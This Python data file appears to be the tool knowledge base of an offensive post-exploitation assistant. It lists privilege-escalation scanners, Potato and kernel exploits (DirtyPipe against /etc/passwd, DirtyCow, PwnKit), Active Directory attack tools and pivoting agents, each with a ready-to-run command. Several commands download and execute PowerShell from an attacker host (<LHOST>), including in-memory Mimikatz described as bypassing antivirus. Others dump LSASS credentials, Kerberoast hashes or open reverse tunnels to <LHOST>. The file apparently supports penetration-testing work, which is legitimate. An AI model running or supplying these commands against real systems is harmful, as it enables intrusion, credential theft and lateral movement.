"""
core/arsenal_rules.py — Post-exploitation tool knowledge base.

Pure data — no logic.  All condition evaluation happens in advisor.py.

Tool entry schema:
    name      : filename as it lives on the HTTP server (tools/windows/ or tools/linux/)
    desc      : one-line purpose shown in notes.md
    dir       : "windows" | "linux"  — subdirectory on the file server
    ext_type  : "exe" | "ps1" | "sh" | "c" | "bin"  — drives transfer command choice
    condition : string key evaluated by advisor._check_condition(), or None (always include)
    run_hint  : exact execution command shown as a checklist item after transfer
"""

# ---------------------------------------------------------------------------
# Windows PrivEsc
# ---------------------------------------------------------------------------

WINDOWS_PRIVESC: list = [
    {
        "name":      "winPEASx64.exe",
        "desc":      "Automated Windows PrivEsc scanner — Modern Windows (x64)",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "modern_windows",
        "run_hint":  r".\winPEASx64.exe > C:\Windows\Temp\winpeas_out.txt 2>&1",
    },
    {
        "name":      "winPEASany.exe",
        "desc":      "Automated Windows PrivEsc scanner — .NET 2.0 legacy (Win7 / Server 2008)",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "old_windows",
        "run_hint":  r".\winPEASany.exe > C:\Windows\Temp\winpeas_out.txt 2>&1",
    },
    {
        "name":      "GodPotato-NET4.exe",
        "desc":      "SeImpersonatePrivilege exploit — Windows Server 2012–2022",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "server_2012_to_2022",
        "run_hint":  r'.\GodPotato-NET4.exe -cmd "cmd /c whoami"',
    },
    {
        "name":      "JuicyPotatoNG.exe",
        "desc":      "Generic SeImpersonatePrivilege / Potato exploit",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": None,
        "run_hint":  r'.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"',
    },
    {
        "name":      "PrintSpoofer64.exe",
        "desc":      "PrintSpoofer — recommended when IIS or MSSQL service is present",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "iis_or_sql",
        "run_hint":  r'.\PrintSpoofer64.exe -i -c "cmd"',
    },
    {
        "name":      "PowerUp.ps1",
        "desc":      "Misconfiguration hunter — unquoted paths, weak services, AlwaysInstallElevated",
        "dir":       "windows",
        "ext_type":  "ps1",
        "condition": None,
        "run_hint":  "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/windows/PowerUp.ps1'); Invoke-AllChecks",
    },
    {
        "name":      "Seatbelt.exe",
        "desc":      "System situational awareness — tokens, credentials, browser data, installed software",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": None,
        "run_hint":  r".\Seatbelt.exe -group=all > C:\Windows\Temp\seatbelt_out.txt 2>&1",
    },
]

# ---------------------------------------------------------------------------
# Active Directory  (condition "is_ad" — triggered by Kerberos/LDAP/domain)
# ---------------------------------------------------------------------------

AD_TOOLS: list = [
    {
        "name":      "mimikatz.exe",
        "desc":      "Credential dumping — LSASS memory, NTLM hashes, Kerberos tickets",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "is_ad",
        "run_hint":  'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
    },
    {
        "name":      "Invoke-Mimikatz.ps1",
        "desc":      "PowerShell Mimikatz — in-memory execution to bypass AV on-disk detection",
        "dir":       "windows",
        "ext_type":  "ps1",
        "condition": "is_ad",
        "run_hint":  "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/windows/Invoke-Mimikatz.ps1'); Invoke-Mimikatz",
    },
    {
        "name":      "Rubeus.exe",
        "desc":      "Kerberos attacks — AS-REP Roasting, Kerberoasting, Pass-the-Ticket",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "is_ad",
        "run_hint":  r".\Rubeus.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt",
    },
    {
        "name":      "SharpHound.exe",
        "desc":      "BloodHound data collector — maps all AD attack paths",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": "is_ad",
        "run_hint":  r".\SharpHound.exe -c All --zipfilename bloodhound_data.zip",
    },
]

# ---------------------------------------------------------------------------
# Linux PrivEsc
# ---------------------------------------------------------------------------

LINUX_PRIVESC: list = [
    {
        "name":      "linpeas.sh",
        "desc":      "Comprehensive Linux PrivEsc scanner — paths, SUID, capabilities, crons",
        "dir":       "linux",
        "ext_type":  "sh",
        "condition": None,
        "run_hint":  "./linpeas.sh | tee /tmp/linpeas_out.txt",
    },
    {
        "name":      "lse.sh",
        "desc":      "Linux Smart Enumeration — tiered output, low-to-high verbosity",
        "dir":       "linux",
        "ext_type":  "sh",
        "condition": None,
        "run_hint":  "./lse.sh -l 1 | tee /tmp/lse_out.txt",
    },
    {
        "name":      "pspy64",
        "desc":      "Unprivileged process monitor — discovers cron jobs and SUID execution (x86_64)",
        "dir":       "linux",
        "ext_type":  "bin",
        "condition": "x86_64",
        "run_hint":  "./pspy64 -pf -i 1000",
    },
    {
        "name":      "pspy32",
        "desc":      "Unprivileged process monitor — 32-bit variant for x86 targets",
        "dir":       "linux",
        "ext_type":  "bin",
        "condition": "x86",
        "run_hint":  "./pspy32 -pf -i 1000",
    },
]

# ---------------------------------------------------------------------------
# Linux Kernel Exploits
# ---------------------------------------------------------------------------

LINUX_KERNEL_EXPLOITS: list = [
    {
        "name":      "dirtypipe.c",
        "desc":      "DirtyPipe (CVE-2022-0847) — write to read-only files, requires kernel >= 5.8",
        "dir":       "linux",
        "ext_type":  "c",
        "condition": "kernel_ge_5_8",
        "run_hint":  "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd",
    },
    {
        "name":      "dirty.c",
        "desc":      "DirtyCow (CVE-2016-5195) — local root via race condition, kernel <= 4.8",
        "dir":       "linux",
        "ext_type":  "c",
        "condition": "kernel_le_4_8",
        "run_hint":  "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty",
    },
    {
        "name":      "pwnkit",
        "desc":      "PwnKit (CVE-2021-4034) — Universal Polkit pkexec local root",
        "dir":       "linux",
        "ext_type":  "bin",
        "condition": None,
        "run_hint":  "./pwnkit",
    },
]

# ---------------------------------------------------------------------------
# Pivoting / Tunnelling — Windows
# ---------------------------------------------------------------------------

PIVOT_TOOLS_WINDOWS: list = [
    {
        "name":      "chisel.exe",
        "desc":      "TCP/UDP tunnel over HTTP — reverse SOCKS5 proxy for proxychains",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": None,
        "run_hint":  r".\chisel.exe client <LHOST>:1080 R:socks",
    },
    {
        "name":      "ligolo-agent.exe",
        "desc":      "Ligolo-ng agent — full layer-3 tunnel, no proxychains needed",
        "dir":       "windows",
        "ext_type":  "exe",
        "condition": None,
        "run_hint":  r".\ligolo-agent.exe -connect <LHOST>:11601 -ignore-cert",
    },
]

# ---------------------------------------------------------------------------
# Pivoting / Tunnelling — Linux
# ---------------------------------------------------------------------------

PIVOT_TOOLS_LINUX: list = [
    {
        "name":      "chisel",
        "desc":      "TCP/UDP tunnel over HTTP — reverse SOCKS5 proxy for proxychains",
        "dir":       "linux",
        "ext_type":  "bin",
        "condition": None,
        "run_hint":  "./chisel client <LHOST>:1080 R:socks",
    },
    {
        "name":      "ligolo-agent",
        "desc":      "Ligolo-ng agent — full layer-3 tunnel, no proxychains needed",
        "dir":       "linux",
        "ext_type":  "bin",
        "condition": None,
        "run_hint":  "./ligolo-agent -connect <LHOST>:11601 -ignore-cert",
    },
]

# ---------------------------------------------------------------------------
# Pivot detection heuristics (used by advisor._detect_pivot_indicators)
# ---------------------------------------------------------------------------

# Ports whose presence suggests this host is a proxy/VPN/gateway
PIVOT_INDICATOR_PORTS: set = {1080, 1194, 3128, 8080}

# Substrings in any discovered hostname that imply a routing/gateway role
PIVOT_INDICATOR_HOSTNAMES: tuple = (
    "gw", "proxy", "vpn", "gateway", "router", "fw", "firewall",
)
